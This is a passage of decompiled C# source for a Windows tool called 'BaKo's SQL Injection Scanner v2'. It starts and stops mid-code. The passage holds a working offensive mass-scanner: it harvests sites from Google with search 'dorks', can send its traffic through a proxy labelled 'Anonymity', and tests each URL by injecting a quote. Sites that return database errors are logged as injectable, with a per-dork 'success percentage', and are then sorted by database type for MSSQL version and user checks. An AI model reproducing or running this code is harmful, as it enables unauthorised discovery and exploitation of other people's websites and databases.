		((Control)txt_version).set_Dock((DockStyle)5);
		RichTextBox obj7 = txt_version;
		location = new Point(3, 3);
		((Control)obj7).set_Location(location);
		((Control)txt_version).set_Name("txt_version");
		RichTextBox obj8 = txt_version;
		size = new Size(682, 134);
		((Control)obj8).set_Size(size);
		((Control)txt_version).set_TabIndex(13);
		txt_version.set_Text("");
		((Control)TabPage10).get_Controls().Add((Control)(object)txt_user);
		TabPage tabPage14 = TabPage10;
		location = new Point(4, 25);
		tabPage14.set_Location(location);
		((Control)TabPage10).set_Name("TabPage10");
		TabPage tabPage15 = TabPage10;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage15).set_Padding(padding);
		TabPage tabPage16 = TabPage10;
		size = new Size(688, 140);
		((Control)tabPage16).set_Size(size);
		TabPage10.set_TabIndex(1);
		TabPage10.set_Text("MSSQL User");
		TabPage10.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_user).set_BackColor(Color.Gray);
		((Control)txt_user).set_Dock((DockStyle)5);
		RichTextBox obj9 = txt_user;
		location = new Point(3, 3);
		((Control)obj9).set_Location(location);
		((Control)txt_user).set_Name("txt_user");
		RichTextBox obj10 = txt_user;
		size = new Size(682, 134);
		((Control)obj10).set_Size(size);
		((Control)txt_user).set_TabIndex(13);
		txt_user.set_Text("");
		TabPage5.set_BackColor(Color.Gray);
		((Control)TabPage5).get_Controls().Add((Control)(object)TabControl1);
		TabPage tabPage17 = TabPage5;
		location = new Point(4, 22);
		tabPage17.set_Location(location);
		((Control)TabPage5).set_Name("TabPage5");
		TabPage tabPage18 = TabPage5;
		size = new Size(696, 169);
		((Control)tabPage18).set_Size(size);
		TabPage5.set_TabIndex(4);
		TabPage5.set_Text("Sorting");
		TabPage5.set_UseVisualStyleBackColor(true);
		TabControl1.set_Appearance((TabAppearance)2);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage6);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage7);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage11);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage12);
		((Control)TabControl1).set_Dock((DockStyle)5);
		TabControl tabControl3 = TabControl1;
		location = new Point(0, 0);
		((Control)tabControl3).set_Location(location);
		((Control)TabControl1).set_Name("TabControl1");
		TabControl1.set_SelectedIndex(0);
		TabControl tabControl4 = TabControl1;
		size = new Size(696, 169);
		((Control)tabControl4).set_Size(size);
		((Control)TabControl1).set_TabIndex(13);
		((Control)TabPage6).get_Controls().Add((Control)(object)txt_mysql);
		TabPage tabPage19 = TabPage6;
		location = new Point(4, 25);
		tabPage19.set_Location(location);
		((Control)TabPage6).set_Name("TabPage6");
		TabPage tabPage20 = TabPage6;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage20).set_Padding(padding);
		TabPage tabPage21 = TabPage6;
		size = new Size(688, 140);
		((Control)tabPage21).set_Size(size);
		TabPage6.set_TabIndex(0);
		TabPage6.set_Text("MySQL");
		TabPage6.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_mysql).set_BackColor(Color.Gray);
		((Control)txt_mysql).set_Dock((DockStyle)5);
		RichTextBox obj11 = txt_mysql;
		location = new Point(3, 3);
		((Control)obj11).set_Location(location);
		((Control)txt_mysql).set_Name("txt_mysql");
		RichTextBox obj12 = txt_mysql;
		size = new Size(682, 134);
		((Control)obj12).set_Size(size);
		((Control)txt_mysql).set_TabIndex(13);
		txt_mysql.set_Text("");
		((Control)TabPage7).get_Controls().Add((Control)(object)txt_mssql);
		TabPage tabPage22 = TabPage7;
		location = new Point(4, 25);
		tabPage22.set_Location(location);
		((Control)TabPage7).set_Name("TabPage7");
		TabPage tabPage23 = TabPage7;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage23).set_Padding(padding);
		TabPage tabPage24 = TabPage7;
		size = new Size(688, 140);
		((Control)tabPage24).set_Size(size);
		TabPage7.set_TabIndex(1);
		TabPage7.set_Text("MSSQL");
		TabPage7.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_mssql).set_BackColor(Color.Gray);
		((Control)txt_mssql).set_Dock((DockStyle)5);
		RichTextBox obj13 = txt_mssql;
		location = new Point(3, 3);
		((Control)obj13).set_Location(location);
		((Control)txt_mssql).set_Name("txt_mssql");
		RichTextBox obj14 = txt_mssql;
		size = new Size(682, 134);
		((Control)obj14).set_Size(size);
		((Control)txt_mssql).set_TabIndex(13);
		txt_mssql.set_Text("");
		((Control)TabPage11).get_Controls().Add((Control)(object)txt_access);
		TabPage tabPage25 = TabPage11;
		location = new Point(4, 25);
		tabPage25.set_Location(location);
		((Control)TabPage11).set_Name("TabPage11");
		TabPage tabPage26 = TabPage11;
		size = new Size(688, 140);
		((Control)tabPage26).set_Size(size);
		TabPage11.set_TabIndex(2);
		TabPage11.set_Text("Microsoft Access (JET)");
		TabPage11.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_access).set_BackColor(Color.Gray);
		((Control)txt_access).set_Dock((DockStyle)5);
		RichTextBox obj15 = txt_access;
		location = new Point(0, 0);
		((Control)obj15).set_Location(location);
		((Control)txt_access).set_Name("txt_access");
		RichTextBox obj16 = txt_access;
		size = new Size(688, 140);
		((Control)obj16).set_Size(size);
		((Control)txt_access).set_TabIndex(13);
		txt_access.set_Text("");
		((Control)TabPage12).get_Controls().Add((Control)(object)txt_unknown);
		TabPage tabPage27 = TabPage12;
		location = new Point(4, 25);
		tabPage27.set_Location(location);
		((Control)TabPage12).set_Name("TabPage12");
		TabPage tabPage28 = TabPage12;
		size = new Size(688, 140);
		((Control)tabPage28).set_Size(size);
		TabPage12.set_TabIndex(3);
		TabPage12.set_Text("Unknown");
		TabPage12.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_unknown).set_BackColor(Color.Gray);
		((Control)txt_unknown).set_Dock((DockStyle)5);
		RichTextBox obj17 = txt_unknown;
		location = new Point(0, 0);
		((Control)obj17).set_Location(location);
		((Control)txt_unknown).set_Name("txt_unknown");
		RichTextBox obj18 = txt_unknown;
		size = new Size(688, 140);
		((Control)obj18).set_Size(size);
		((Control)txt_unknown).set_TabIndex(13);
		txt_unknown.set_Text("");
		((Control)TabPage4).get_Controls().Add((Control)(object)txt_status);
		TabPage tabPage29 = TabPage4;
		location = new Point(4, 22);
		tabPage29.set_Location(location);
		((Control)TabPage4).set_Name("TabPage4");
		TabPage tabPage30 = TabPage4;
		size = new Size(696, 169);
		((Control)tabPage30).set_Size(size);
		TabPage4.set_TabIndex(3);
		TabPage4.set_Text("Status");
		TabPage4.set_UseVisualStyleBackColor(true);
		((TextBoxBase)txt_status).set_BackColor(Color.Gray);
		((Control)txt_status).set_Dock((DockStyle)5);
		RichTextBox obj19 = txt_status;
		location = new Point(0, 0);
		((Control)obj19).set_Location(location);
		((Control)txt_status).set_Name("txt_status");
		RichTextBox obj20 = txt_status;
		size = new Size(696, 169);
		((Control)obj20).set_Size(size);
		((Control)txt_status).set_TabIndex(13);
		txt_status.set_Text("");
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("LilyUPC", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)222));
		((Control)Label1).set_ForeColor(Color.Honeydew);
		Label label = Label1;
		location = new Point(6, 22);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(79, 19);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("GoogleDork:");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(19, 115);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(0, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(2);
		((ButtonBase)chk_site).set_AutoSize(true);
		((ButtonBase)chk_site).set_BackColor(Color.Transparent);
		((Control)chk_site).set_Font(new Font("LilyUPC", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)222));
		((Control)chk_site).set_ForeColor(Color.Honeydew);
		CheckBox obj21 = chk_site;
		location = new Point(9, 48);
		((Control)obj21).set_Location(location);
		((Control)chk_site).set_Name("chk_site");
		CheckBox obj22 = chk_site;
		size = new Size(134, 23);
		((Control)obj22).set_Size(size);
		((Control)chk_site).set_TabIndex(3);
		((ButtonBase)chk_site).set_Text("Scan Specific Site:");
		((ButtonBase)chk_site).set_UseVisualStyleBackColor(false);
		Logo.set_AutoSize(true);
		((Control)Logo).set_BackColor(Color.Transparent);
		((Control)Logo).set_Font(new Font("Rufa", 30f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Logo).set_ForeColor(Color.Honeydew);
		Label logo = Logo;
		location = new Point(-2, 9);
		((Control)logo).set_Location(location);
		((Control)Logo).set_Name("Logo");
		Label logo2 = Logo;
		size = new Size(744, 44);
		((Control)logo2).set_Size(size);
		((Control)Logo).set_TabIndex(0);
		Logo.set_Text("BaKo's SQL Injection Scanner v2");
		((Control)GroupBox1).set_BackColor(Color.Transparent);
		((Control)GroupBox1).get_Controls().Add((Control)(object)txt_prefix);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)txt_site);
		((Control)GroupBox1).get_Controls().Add((Control)(object)txt_dork);
		((Control)GroupBox1).get_Controls().Add((Control)(object)btn_sites);
		((Control)GroupBox1).get_Controls().Add((Control)(object)btn_google);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)chk_site);
		((Control)GroupBox1).set_ForeColor(Color.SeaGreen);
		GroupBox groupBox = GroupBox1;
		location = new Point(6, 85);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		size = new Size(289, 136);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(4);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Scanning");
		TextBox obj23 = txt_prefix;
		location = new Point(120, 77);
		((Control)obj23).set_Location(location);
		((Control)txt_prefix).set_Name("txt_prefix");
		TextBox obj24 = txt_prefix;
		size = new Size(148, 20);
		((Control)obj24).set_Size(size);
		((Control)txt_prefix).set_TabIndex(10);
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.Transparent);
		((Control)Label3).set_Font(new Font("LilyUPC", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)222));
		((Control)Label3).set_ForeColor(Color.Honeydew);
		Label label5 = Label3;
		location = new Point(6, 77);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(112, 19);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(9);
		Label3.set_Text("Output File prefix:");
		TextBox obj25 = txt_site;
		location = new Point(142, 49);
		((Control)obj25).set_Location(location);
		((Control)txt_site).set_Name("txt_site");
		TextBox obj26 = txt_site;
		size = new Size(126, 20);
		((Control)obj26).set_Size(size);
		((Control)txt_site).set_TabIndex(8);
		TextBox obj27 = txt_dork;
		location = new Point(91, 22);
		((Control)obj27).set_Location(location);
		((Control)txt_dork).set_Name("txt_dork");
		TextBox obj28 = txt_dork;
		size = new Size(177, 20);
		((Control)obj28).set_Size(size);
		((Control)txt_dork).set_TabIndex(7);
		((Control)btn_sites).set_ForeColor(Color.Black);
		Button obj29 = btn_sites;
		location = new Point(170, 104);
		((Control)obj29).set_Location(location);
		((Control)btn_sites).set_Name("btn_sites");
		Button obj30 = btn_sites;
		size = new Size(99, 23);
		((Control)obj30).set_Size(size);
		((Control)btn_sites).set_TabIndex(6);
		((ButtonBase)btn_sites).set_Text("Test Sites");
		((ButtonBase)btn_sites).set_UseVisualStyleBackColor(true);
		((Control)btn_google).set_ForeColor(Color.Black);
		Button obj31 = btn_google;
		location = new Point(10, 104);
		((Control)obj31).set_Location(location);
		((Control)btn_google).set_Name("btn_google");
		Button obj32 = btn_google;
		size = new Size(102, 23);
		((Control)obj32).set_Size(size);
		((Control)btn_google).set_TabIndex(5);
		((ButtonBase)btn_google).set_Text("Scan Google");
		((ButtonBase)btn_google).set_UseVisualStyleBackColor(true);
		((Control)GroupBox2).set_BackColor(Color.Transparent);
		((Control)GroupBox2).get_Controls().Add((Control)(object)btn_version);
		((Control)GroupBox2).get_Controls().Add((Control)(object)btn_user);
		((Control)GroupBox2).get_Controls().Add((Control)(object)btn_dbtype);
		((Control)GroupBox2).set_ForeColor(Color.White);
		GroupBox groupBox3 = GroupBox2;
		location = new Point(520, 85);
		((Control)groupBox3).set_Location(location);
		((Control)GroupBox2).set_Name("GroupBox2");
		GroupBox groupBox4 = GroupBox2;
		size = new Size(190, 136);
		((Control)groupBox4).set_Size(size);
		((Control)GroupBox2).set_TabIndex(5);
		GroupBox2.set_TabStop(false);
		GroupBox2.set_Text("Injection Info");
		((Control)btn_version).set_ForeColor(Color.Black);
		Button obj33 = btn_version;
		location = new Point(6, 104);
		((Control)obj33).set_Location(location);
		((Control)btn_version).set_Name("btn_version");
		Button obj34 = btn_version;
		size = new Size(175, 23);
		((Control)obj34).set_Size(size);
		((Control)btn_version).set_TabIndex(8);
		((ButtonBase)btn_version).set_Text("Check MSSQL Version");
		((ButtonBase)btn_version).set_UseVisualStyleBackColor(true);
		((Control)btn_user).set_ForeColor(Color.Black);
		Button obj35 = btn_user;
		location = new Point(6, 63);
		((Control)obj35).set_Location(location);
		((Control)btn_user).set_Name("btn_user");
		Button obj36 = btn_user;
		size = new Size(175, 23);
		((Control)obj36).set_Size(size);
		((Control)btn_user).set_TabIndex(7);
		((ButtonBase)btn_user).set_Text("Check MSSQL User");
		((ButtonBase)btn_user).set_UseVisualStyleBackColor(true);
		((Control)btn_dbtype).set_ForeColor(Color.Black);
		Button obj37 = btn_dbtype;
		location = new Point(6, 19);
		((Control)obj37).set_Location(location);
		((Control)btn_dbtype).set_Name("btn_dbtype");
		Button obj38 = btn_dbtype;
		size = new Size(175, 23);
		((Control)obj38).set_Size(size);
		((Control)btn_dbtype).set_TabIndex(6);
		((ButtonBase)btn_dbtype).set_Text("Sort by Database Server Type");
		((ButtonBase)btn_dbtype).set_UseVisualStyleBackColor(true);
		((Control)GroupBox3).set_BackColor(Color.Transparent);
		((Control)GroupBox3).get_Controls().Add((Control)(object)txt_port);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label5);
		((Control)GroupBox3).get_Controls().Add((Control)(object)txt_server);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox3).get_Controls().Add((Control)(object)chk_proxy);
		GroupBox groupBox5 = GroupBox3;
		location = new Point(301, 85);
		((Control)groupBox5).set_Location(location);
		((Control)GroupBox3).set_Name("GroupBox3");
		GroupBox groupBox6 = GroupBox3;
		size = new Size(213, 136);
		((Control)groupBox6).set_Size(size);
		((Control)GroupBox3).set_TabIndex(7);
		GroupBox3.set_TabStop(false);
		GroupBox3.set_Text("Anonymity");
		TextBox obj39 = txt_port;
		location = new Point(98, 82);
		((Control)obj39).set_Location(location);
		((Control)txt_port).set_Name("txt_port");
		TextBox obj40 = txt_port;
		size = new Size(109, 20);
		((Control)obj40).set_Size(size);
		((Control)txt_port).set_TabIndex(11);
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.Transparent);
		((Control)Label5).set_Font(new Font("LilyUPC", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)222));
		((Control)Label5).set_ForeColor(Color.Honeydew);
		Label label7 = Label5;
		location = new Point(13, 82);
		((Control)label7).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label8 = Label5;
		size = new Size(76, 19);
		((Control)label8).set_Size(size);
		((Control)Label5).set_TabIndex(10);
		Label5.set_Text("Proxy Port:");
		TextBox obj41 = txt_server;
		location = new Point(98, 48);
		((Control)obj41).set_Location(location);
		((Control)txt_server).set_Name("txt_server");
		TextBox obj42 = txt_server;
		size = new Size(109, 20);
		((Control)obj42).set_Size(size);
		((Control)txt_server).set_TabIndex(9);
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.Transparent);
		((Control)Label4).set_Font(new Font("LilyUPC", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)222));
		((Control)Label4).set_ForeColor(Color.Honeydew);
		Label label9 = Label4;
		location = new Point(4, 48);
		((Control)label9).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label10 = Label4;
		size = new Size(88, 19);
		((Control)label10).set_Size(size);
		((Control)Label4).set_TabIndex(8);
		Label4.set_Text("Proxy Server:");
		((ButtonBase)chk_proxy).set_AutoSize(true);
		((ButtonBase)chk_proxy).set_BackColor(Color.Transparent);
		((Control)chk_proxy).set_Font(new Font("LilyUPC", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)222));
		((Control)chk_proxy).set_ForeColor(Color.Honeydew);
		CheckBox obj43 = chk_proxy;
		location = new Point(56, 18);
		((Control)obj43).set_Location(location);
		((Control)chk_proxy).set_Name("chk_proxy");
		CheckBox obj44 = chk_proxy;
		size = new Size(109, 23);
		((Control)obj44).set_Size(size);
		((Control)chk_proxy).set_TabIndex(4);
		((ButtonBase)chk_proxy).set_Text("Use a Proxy?");
		((ButtonBase)chk_proxy).set_UseVisualStyleBackColor(false);
		txt_totalcount.set_AutoSize(true);
		((Control)txt_totalcount).set_BackColor(Color.Lime);
		Label obj45 = txt_totalcount;
		location = new Point(7, 432);
		((Control)obj45).set_Location(location);
		((Control)txt_totalcount).set_Name("txt_totalcount");
		Label obj46 = txt_totalcount;
		size = new Size(105, 13);
		((Control)obj46).set_Size(size);
		((Control)txt_totalcount).set_TabIndex(8);
		txt_totalcount.set_Text("Total Sites Found: 0 ");
		txt_injectionstatus.set_AutoSize(true);
		((Control)txt_injectionstatus).set_BackColor(Color.Lime);
		Label obj47 = txt_injectionstatus;
		location = new Point(587, 432);
		((Control)obj47).set_Location(location);
		((Control)txt_injectionstatus).set_Name("txt_injectionstatus");
		Label obj48 = txt_injectionstatus;
		size = new Size(114, 13);
		((Control)obj48).set_Size(size);
		((Control)txt_injectionstatus).set_TabIndex(9);
		txt_injectionstatus.set_Text("Injection Status: 0/0/0");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)(object)Resources.digital_shodan);
		((Control)this).set_BackgroundImageLayout((ImageLayout)2);
		size = new Size(735, 448);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)txt_injectionstatus);
		((Control)this).get_Controls().Add((Control)(object)txt_totalcount);
		((Control)this).get_Controls().Add((Control)(object)GroupBox3);
		((Control)this).get_Controls().Add((Control)(object)val);
		((Control)this).get_Controls().Add((Control)(object)GroupBox2);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Logo);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("BaKo's SQL Injection Scanner v2");
		((Control)val).ResumeLayout(false);
		((Control)TabPage1).ResumeLayout(false);
		((Control)TabPage2).ResumeLayout(false);
		((Control)TabPage3).ResumeLayout(false);
		((Control)TabPage8).ResumeLayout(false);
		((Control)TabControl2).ResumeLayout(false);
		((Control)TabPage9).ResumeLayout(false);
		((Control)TabPage10).ResumeLayout(false);
		((Control)TabPage5).ResumeLayout(false);
		((Control)TabControl1).ResumeLayout(false);
		((Control)TabPage6).ResumeLayout(false);
		((Control)TabPage7).ResumeLayout(false);
		((Control)TabPage11).ResumeLayout(false);
		((Control)TabPage12).ResumeLayout(false);
		((Control)TabPage4).ResumeLayout(false);
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)GroupBox2).ResumeLayout(false);
		((Control)GroupBox3).ResumeLayout(false);
		((Control)GroupBox3).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		txt_status.set_Text("Succesfully loaded " + Conversions.ToString(Information.UBound(keywords, 1)) + " SQL Injection Keywords from the keywords file.\r\n");
	}

	public object connect(string sURL)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(sURL);
			webRequest.Timeout = 30000;
			if (0 - (chk_proxy.get_Checked() ? 1 : 0) == -1)
			{
				int port = Conversions.ToInteger(txt_port.get_Text());
				WebProxy webProxy = new WebProxy(txt_server.get_Text(), port);
				webProxy.BypassProxyOnLocal = true;
				webRequest.Proxy = webProxy;
			}
			Stream responseStream = webRequest.GetResponse().GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			string text = "";
			int num = 0;
			string text2 = "";
			while (text != null)
			{
				num = checked(num + 1);
				text = streamReader.ReadLine();
				if (text != null)
				{
					text2 += text;
				}
			}
			return text2;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			object result;
			if (Operators.CompareString(ex2.Message, "The remote server returned an error: (500) Internal Server Error.", false) == 0)
			{
				result = "Injectable";
				ProjectData.ClearProjectError();
				return result;
			}
			result = "timeout";
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
		}
	}

	private void btn_google_Click(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		if ((txt_dork.get_Text().Length == 0) | (txt_prefix.get_Text().Length == 0))
		{
			MessageBox.Show("Must fill in the Dork box and the Output File Prefix box!");
			return;
		}
		string text = txt_dork.get_Text();
		if (0 - (chk_site.get_Checked() ? 1 : 0) == -1)
		{
			if (txt_site.get_Text().Length == 0)
			{
				MessageBox.Show("You must fill in the site to scan!");
			}
			else
			{
				text = "site:" + txt_site.get_Text() + " " + text;
			}
		}
		RichTextBox val = txt_status;
		val.set_Text(val.get_Text() + "Using the Googledork: " + text + "\r\n");
		Application.DoEvents();
		string text2 = dir + "\\googlescans\\" + txt_prefix.get_Text() + "_vuln.txt";
		val = txt_status;
		val.set_Text(val.get_Text() + "Writing to: " + text2 + "\r\n");
		Application.DoEvents();
		ArrayList arrayList = (ArrayList)scangoogle(text);
		val = txt_status;
		val.set_Text(val.get_Text() + "GoogleScan Finished. Found " + Conversions.ToString(arrayList.Count) + " sites.\r\n");
		Application.DoEvents();
		if (File.Exists(text2))
		{
			File.Delete(text2);
		}
		for (int i = 0; i < arrayList.Count; i = checked(i + 1))
		{
			File.AppendAllText(text2, Conversions.ToString(Operators.ConcatenateObject(arrayList[i], (object)"\r\n")));
		}
		val = txt_status;
		val.set_Text(val.get_Text() + "Saved the results to " + text2 + "\r\n");
		MessageBox.Show("GoogleScan Finished. Found " + Conversions.ToString(arrayList.Count) + " sites! Saved the results to " + text2);
		txt_totalcount.set_Text("Total Sites Found: " + Conversions.ToString(arrayList.Count));
		txt_injectionstatus.set_Text("Injection Status: 0/0/" + Conversions.ToString(arrayList.Count));
		psites = arrayList;
	}

	public object scangoogle(string query)
	{
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		int num2 = 0;
		int num3 = 0;
		string text = "";
		int num4 = 0;
		string text2 = Conversions.ToString(0);
		ArrayList arrayList = new ArrayList();
		while (num4 <= 1000 && num3 == 0)
		{
			Application.DoEvents();
			text = "http://www.google.com/search?q=" + query + "&num=100&hl=en&start=" + Conversions.ToString(num4) + "&sa=N";
			text2 = Conversions.ToString(connect(text));
			checked
			{
				if (Strings.InStr(text2, "> virus checker</a> or", (CompareMethod)0) != 0)
				{
					MessageBox.Show("Google blocked us, stopping the scan early.");
					num3 = 1;
				}
				else
				{
					Array array = Strings.Split(text2, "<div class=g>", -1, (CompareMethod)0);
					while (unchecked(num < Information.UBound(array, 1) && num3 == 0))
					{
						string text3 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null));
						Array array2 = Strings.Split(text3, "\" class=l>", -1, (CompareMethod)0);
						text3 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
						Array array3 = Strings.Split(text3, "<a href=\"", -1, (CompareMethod)0);
						text3 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null));
						num++;
						if ((Strings.InStr(text3, "<span", (CompareMethod)0) | Strings.InStr(text3, "\"span='", (CompareMethod)0)) == 0)
						{
							Application.DoEvents();
							num2++;
							arrayList.Add(text3);
							RichTextBox val = txt_allsites;
							val.set_Text(val.get_Text() + text3 + "\r\n");
							Application.DoEvents();
						}
						Application.DoEvents();
					}
				}
				num = 0;
				num4 += 100;
				if (Strings.InStr(text2, "In order to show you the most relevant results, we have", (CompareMethod)0) != 0)
				{
					num3 = 1;
				}
			}
		}
		return arrayList;
	}

	private void btn_sites_Click(object sender, EventArgs e)
	{
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0311: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int i = 0;
			int j = 0;
			int num = 0;
			int num2 = 0;
			string text = "";
			string text2 = "";
			string text3 = "";
			string text4 = "";
			Application.DoEvents();
			RichTextBox val;
			for (; i < psites.Count; i = checked(i + 1))
			{
				num2 = 0;
				text = Conversions.ToString(psites[i]);
				text2 = Strings.Replace(text, "=", "='", 1, -1, (CompareMethod)0);
				text3 = Conversions.ToString(connect(text2));
				Application.DoEvents();
				if (Strings.InStr(text3, "Microsoft VBScript runtime  error", (CompareMethod)0) == 0)
				{
					for (; j <= Information.UBound(keywords, 1) && num2 == 0; j = checked(j + 1))
					{
						if (((uint)Strings.InStr(text3, Conversions.ToString(NewLateBinding.LateIndexGet((object)keywords, new object[1] { j }, (string[])null)), (CompareMethod)0) | (0u - ((Operators.CompareString(text3, "Injectable", false) == 0) ? 1u : 0u))) != 0)
						{
							Application.DoEvents();
							val = txt_injections;
							val.set_Text(val.get_Text() + text2 + "\r\n");
							Application.DoEvents();
							text4 = text4 + text2 + "\r\n";
							num = checked(num + 1);
							num2 = 1;
						}
					}
				}
				if (num2 == 0)
				{
					Application.DoEvents();
					val = txt_secure;
					val.set_Text(val.get_Text() + text2 + "\r\n");
					Application.DoEvents();
				}
				j = 0;
				Application.DoEvents();
				txt_injectionstatus.set_Text("Injection Status: " + Conversions.ToString(num) + "/" + Conversions.ToString(i) + "/" + Conversions.ToString(psites.Count));
				Application.DoEvents();
			}
			string text5 = dir + "\\vulnsites\\" + txt_prefix.get_Text() + "vuln.txt";
			if (File.Exists(text5))
			{
				File.Delete(text5);
			}
			File.WriteAllText(text5, text4);
			MessageBox.Show("Found a total of " + Conversions.ToString(num) + " injections! They were saved to " + text5 + ". This dork had a success percentage of " + Conversions.ToString((double)num / (double)psites.Count * 100.0) + "%.");
			val = txt_status;
			val.set_Text(val.get_Text() + "Found a total of " + Conversions.ToString(num) + " injections! They were saved to " + text5 + ". This dork had a success percentage of " + Conversions.ToString((double)num / (double)psites.Count * 100.0) + "%.\r\n");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			MessageBox.Show("You must Scan Google for Sites first before you can test the sites!");
			ProjectData.ClearProjectError();
		}
	}

	public string DoSocketGet(string server, string path)
	{
		try
		{
			Encoding aSCII = Encoding.ASCII;
			string s = "GET " + path + " HTTP/1.1\r\nHost: " + server + "\r\nConnection: Close\r\n\r\n";
			byte[] bytes = aSCII.GetBytes(s);
			byte[] array = new byte[257];
			string text = null;
			IPAddress address = Dns.Resolve(server).AddressList[0];
			IPEndPoint remoteEP = new IPEndPoint(address, 80);
			Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			socket.SendTimeout = 10000;
			socket.ReceiveTimeout = 10000;
			socket.Connect(remoteEP);
			if (!socket.Connected)
			{
				return "Unable to connect to host";
			}
			socket.Send(bytes, bytes.Length, SocketFlags.None);
			int num = socket.Receive(array, array.Length, SocketFlags.None);
			text = "Default HTML page on " + server + ":\r\n";
			text += aSCII.GetString(array, 0, num);
			while (num > 0)
			{
				num = socket.Receive(array, array.Length, SocketFlags.None);
				text += aSCII.GetString(array, 0, num);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "wtferror!";
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
		}
	}

	private void btn_dbtype_Click(object sender, EventArgs e)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_074f: Unknown result type (might be due to invalid IL or missing references)
		((CommonDialog)Open).ShowDialog();
		if (((FileDialog)Open).get_FileName().Length < 1)
		{
			MessageBox.Show("You must choose a file of injections to sort!");
			return;
		}
		Array array = File.ReadAllLines(((FileDialog)Open).get_FileName());
		Application.DoEvents();
		Array array2 = File.ReadAllLines(dir + "\\inc\\mysql.txt");
		Application.DoEvents();
		Array array3 = File.ReadAllLines(dir + "\\inc\\mssql.txt");
		Application.DoEvents();
		Array array4 = File.ReadAllLines(dir + "\\inc\\access.txt");
		Application.DoEvents();
		int num = 0;
		string text = "";
		string text2 = "";
		string text3 = "";
		int i = 0;
		int j = 0;
		int k = 0;
		int num2 = 0;
		int num3 = 0;
		int num4 = 0;
		int num5 = 0;
		int num6 = 0;
		string text4 = "";
		string text5 = "";
		string text6 = "";
		string text7 = "";
		int num7 = Information.UBound(array, 1);
